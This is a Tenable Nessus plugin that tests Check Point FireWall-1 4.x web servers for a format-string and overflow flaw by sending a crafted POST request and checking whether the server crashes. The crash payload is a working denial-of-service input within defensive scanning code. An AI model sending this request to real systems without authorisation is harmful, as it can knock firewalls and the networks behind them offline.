#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");


if (description)
{
  script_id(12084);
  script_version("$Revision: 1.33 $");
  script_cvs_date("$Date: 2014/05/25 02:11:20 $");

  script_cve_id("CVE-2004-0039", "CVE-2004-0699");
  script_bugtraq_id(10820, 9581);
  script_osvdb_id(4414, 8290);

  script_name(english:"Check Point FireWall-1 4.x Multiple Vulnerabilities (OF, FS)");
  script_summary(english:"Crash Check Point Firewall");

  script_set_attribute(attribute:"synopsis", value:"The remote web server has a denial of service vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote Check Point Firewall web server crashes when sent a
specially formatted HTTP request. A remote attacker could use this to
crash the web server, or possibly execute arbitrary code.

This bug is a solid indicator that the server is vulnerable to several
other Check Point FW-1 4.x bugs that Nessus did not check for.");

  # http://www.checkpoint.com/services/techsupport/alerts/security_server.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?c281a3fa");
  script_set_attribute(attribute:"solution", value:"Apply the configurationn change referenced in the vendor's advisory.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:U/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2004/02/04");
  script_set_attribute(attribute:"plugin_publication_date", value:"2004/03/02");

  script_set_attribute(attribute:"potential_vulnerability", value:"true");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:checkpoint:firewall-1");
  script_end_attributes();

  script_category(ACT_DENIAL);
  script_family(english:"Firewalls");

  script_copyright(english:"This script is Copyright (C) 2004-2014 Tenable Network Security, Inc.");

  script_dependencie("http_version.nasl");
  script_require_keys("Settings/ParanoidReport");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include ("misc_func.inc");
include ("http.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

port = get_http_port(default:80);

# first off, make sure server is actually responding and is FW-1
r = http_get_cache(item:"/", port:port, exit_on_fail: 1);
if (! egrep(string:r, pattern:"^FW-1 at"))
 exit(0, "FW-1 is not running on port "+port+".");

# The old script used a method that was prone to FPs
if (http_is_dead(port: port))
 exit(0, "The web server on port "+port+" is already dead.");

req = 'POST %s/NessusScanner/nonexistent.html HTTP/1.0\r\n' +
    crap(data:"A", length:1024) + '\r\n\r\n';

w = http_send_recv_buf(port: port, data: req, exit_on_fail: 0);

if (http_is_dead(port: port, retry: 2)) security_hole(port);
